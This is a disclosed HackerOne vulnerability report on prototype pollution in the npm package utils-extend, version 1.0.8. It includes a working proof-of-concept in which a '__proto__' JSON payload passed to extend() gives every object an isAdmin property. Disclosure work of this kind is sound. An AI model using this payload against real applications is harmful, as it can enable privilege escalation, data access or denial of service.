---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '801522'
original_report_id: '801522'
title: '[utils-extend] Prototype pollution'
weakness: Modification of Assumed-Immutable Data (MAID)
team_handle: nodejs-ecosystem
created_at: '2020-02-21T07:35:31.190Z'
disclosed_at: '2020-04-02T08:57:57.394Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
asset_identifier: utils-extend
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- modification-of-assumed-immutable-data-maid
---

# [utils-extend] Prototype pollution

## Metadata

- HackerOne Report ID: 801522
- Weakness: Modification of Assumed-Immutable Data (MAID)
- Program: nodejs-ecosystem
- Disclosed At: 2020-04-02T08:57:57.394Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report `prototype polution` in `utils-extend`
It allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation (DoS, access to sensitive data, RCE).

# Module

**module name:** utils-extend
**version:** 1.0.8
**npm page:** `https://www.npmjs.com/package/utils-extend`

## Module Description

> Extend nodejs util api, and it is light weight and simple.

## Module Stats

[1] weekly downloads : **129,956**

# Vulnerability

## Vulnerability Description

## Steps To Reproduce:

1. npm install --save utils-extend
2. create file index.js with content :

```javascript
const { extend } = require('utils-extend');
const payload = '{"__proto__":{"isAdmin":true}}'
const emptyObject = {}
const pollutionObject = JSON.parse(payload);
extend({}, pollutionObject)
console.log(emptyObject.isAdmin)  // true
```

3. run `node index.js` => true 

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N] : N
- I opened an issue in the related repository: [Y/N]  : N

## Impact

Can result in: dos, access to restricted data, rce (depends on implementation)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
